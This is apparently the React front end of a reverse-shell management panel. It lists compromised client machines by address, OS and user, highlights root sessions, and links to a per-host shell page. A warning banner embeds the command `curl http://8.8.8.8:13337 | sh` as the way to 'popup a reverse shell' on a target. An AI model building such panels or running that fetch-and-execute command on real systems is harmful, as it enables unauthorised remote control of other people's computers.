import React from "react";
import "./App.less";

import { Table, Tag, Button, Tooltip, Layout ,Menu, Alert } from 'antd';


const axios = require("axios");
const moment = require("moment")

const { Header, Content, Sider } = Layout;

let baseUrl = ["http://", window.location.host].join("")
let apiUrl = [baseUrl + "/api"].join("")

const columns = [
  {
    title: "Address",
    dataIndex: "host",
    key: "host",
    align: "center",
    render: (data, line, index) => {
      return <Tooltip title={"Hash:" + line.hash}>
        <span>{line.host + ":" + line.port}</span>
      </Tooltip>
    }
  },
  {
    title: "OS",
    dataIndex: "os",
    key: "os",
    align: "center",
    render: (data) => {
      switch (data) {
        case 1:
          return "Linux"
        case 2:
          return "Windows"
        case 3:
          return "SunOS"
        case 4:
          return "MacOS"
        case 5:
          return "FreeBSD"
        default:
          return "Unknown Operating System"
      }
    },
  },
  {
    title: "Username",
    dataIndex: "user",
    key: "user",
    align: "center",
    render: (data) => {
      let color = "green"
      if (data === "root") {
        color = "red"
      }
      return <Tag color={color}>
        {data}
      </Tag>
    },
    
  },
  {
    title: "Online Time",
    dataIndex: "timestamp",
    key: "timestamp",
    align: "center",
    render: (data) => {
      return "Onlined at " + moment(data).fromNow()
    }
  },
  {
    title: 'Action',
    key: 'x',
    render: (data, line, index) => {
      return <Button><a href={[baseUrl, "/shell" + "/?" + line.hash].join("")} target={"_blank"} rel={["noopener", "noreferrer"].join(" ")}>Shell</a></Button>
    },
  },
];

function generateClientsArray(data) {
  let clients = [];
  for (let [k, v] of Object.entries(data)) {
    v.hash = k;
    v.key = k;
    clients.push(v);
  }
  return clients;
}

class App extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      bottom: "bottomLeft",
      serversResponse: null,
      servers: [],
      clients: [],
    };
  }

  componentDidMount() {
    axios
      .get([apiUrl, "/server"].join(""))
      .then((response) => {
        console.log(response);
        let servers = [];

        this.setState({ serversResponse: response.data.msg });

        for (let [k, v] of Object.entries(response.data.msg)) {
          v.hash = k;
          v.key = k;
          servers.push(v);
        }

        if (servers.length > 0) {
          this.setState({
            clients: generateClientsArray(servers[0].clients),
          });
        }

        this.setState({ servers: servers });
      })
      .then(() => {
        if (this.state.clients.length > 0) {
          axios
            .get([apiUrl,"/server" + "/" + this.state.servers[0].hash + "/client"].join(""))
            .then((response) => {
              this.setState({
                clients: generateClientsArray(response.data.msg),
              });
            });
        }
      });
  }

  render() {
    return (
      <Layout>
        <Header className="header">
          <div className="logo" />
          <Menu theme="dark" mode="horizontal" defaultSelectedKeys={["2"]}>
            <Menu.Item key="0">nav 1</Menu.Item>
          </Menu>
        </Header>
        <Layout style={{ height: "100%" }}>
          <Sider width={200} className="site-layout-background">
            <Menu
              mode="inline"
              defaultSelectedKeys={["1"]}
              defaultOpenKeys={["sub1"]}
              style={{ height: "100%", borderRight: 0 }}
            >
              {this.state.servers.map((value, index) => {
                return (
                  <Menu.Item
                    key={value.hash}
                    onClick={(item, key, keyPath, domEvent) => {
                      axios
                        .get([apiUrl,"/server" + "/" + item.key + "/client"].join(""))
                        .then((response) => {
                          this.setState({
                            clients: generateClientsArray(response.data.msg),
                          });
                        });
                    }}
                  >
                    {value.port}
                  </Menu.Item>
                );
              })}
            </Menu>
          </Sider>
          <Layout style={{ padding: "0 24px 24px" }}>
            <Content style={{ margin: "0 0" }}>
              <Alert
                message="Warning"
                description="You can use `curl http://8.8.8.8:13337 | sh` to popup a reverse shell."
                type="warning"
                showIcon
                closable
              />
              <Table
                columns={columns}
                pagination={{ position: [this.state.bottom] }}
                dataSource={this.state.clients}
              />
            </Content>
          </Layout>
        </Layout>
      </Layout>
    );
  }
}

export default App;
